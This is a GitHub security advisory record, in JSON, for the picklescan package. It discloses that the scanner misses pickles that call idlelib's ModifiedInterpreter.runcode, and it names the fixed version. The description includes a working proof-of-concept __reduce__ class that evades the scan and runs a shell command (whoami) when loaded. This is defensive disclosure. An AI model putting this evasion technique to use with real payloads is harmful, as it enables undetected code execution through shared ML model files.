{
  "Severity": "MODERATE",
  "UpdatedAt": "2025-08-26T21:37:51Z",
  "Package": {
    "Ecosystem": "PIP",
    "Name": "picklescan"
  },
  "Advisory": {
    "DatabaseId": 309041,
    "Id": "GSA_kwCzR0hTQS0zZ2Y1LWN4cTktdzIyM84ABLcx",
    "GhsaId": "GHSA-3gf5-cxq9-w223",
    "References": [
      {
        "Url": "https://github.com/mmaitre314/picklescan/security/advisories/GHSA-3gf5-cxq9-w223"
      },
      {
        "Url": "https://github.com/mmaitre314/picklescan/commit/1931c2d04eaca8d20597705ff39cab78ba364e4b"
      },
      {
        "Url": "https://github.com/advisories/GHSA-3gf5-cxq9-w223"
      }
    ],
    "Identifiers": [
      {
        "Type": "GHSA",
        "Value": "GHSA-3gf5-cxq9-w223"
      }
    ],
    "Description": "### Summary\n\nUsing idlelib.pyshell.ModifiedInterpreter.runcode function, which is a built-in python library function to execute remote pickle file.\n\n### Details\n\nThe attack payload executes in the following steps:\n\nFirst, the attacker craft the payload by calling to idlelib.pyshell.ModifiedInterpreter.runcode function in reduce method\nThen when the victim after checking whether the pickle file is safe by using Picklescan library and this library doesn't dectect any dangerous functions, decide to pickle.load() this malicious pickle file, thus lead to remote code execution.\n\n### PoC\n\n```\n\nfrom idlelib.pyshell import ModifiedInterpreter\nfrom types import SimpleNamespace\n\nclass EvilIdlelibPyshellModifiedInterpreterRuncode:\n    def __reduce__(self):\n        payload = \"__import__('os').system('whoami')\"\n        fake_self = SimpleNamespace(\n            locals={},\n            tkconsole=SimpleNamespace(\n                executing=False,\n                beginexecuting=str,\n                canceled=False,\n                closing=False,\n                showtraceback=str,\n                endexecuting=str,\n                stderr=None,\n                text=SimpleNamespace(),\n                getvar=str\n            ),\n            rpcclt=None,\n            debugger=None,\n            checklinecache=str,\n            active_seq=None,\n            showtraceback=str,\n            canceled=False,\n            closing=False\n        )\n        return ModifiedInterpreter.runcode, (fake_self, payload)\n\n```\n\n### Impact\n\nWho is impacted? Any organization or individual relying on picklescan to detect malicious pickle files inside PyTorch models.\nWhat is the impact? Attackers can embed malicious code in pickle file that remains undetected but executes when the pickle file is loaded.\nSupply Chain Attack: Attackers can distribute infected pickle files across ML models, APIs, or saved Python objects.\n\n### Corresponding\n\nhttps://github.com/FredericDT\nhttps://github.com/Qhaoduoyu",
    "Origin": "UNSPECIFIED",
    "PublishedAt": "2025-08-26T21:37:48Z",
    "Severity": "MODERATE",
    "Summary": "Picklescan is missing detection when calling built-in python idlelib.pyshell.ModifiedInterpreter.runcode",
    "UpdatedAt": "2025-08-26T21:37:51Z",
    "WithdrawnAt": "",
    "CVSS": {
      "Score": 0,
      "VectorString": ""
    }
  },
  "Versions": [
    {
      "FirstPatchedVersion": {
        "Identifier": "0.0.30"
      },
      "VulnerableVersionRange": "\u003c 0.0.30"
    }
  ]
}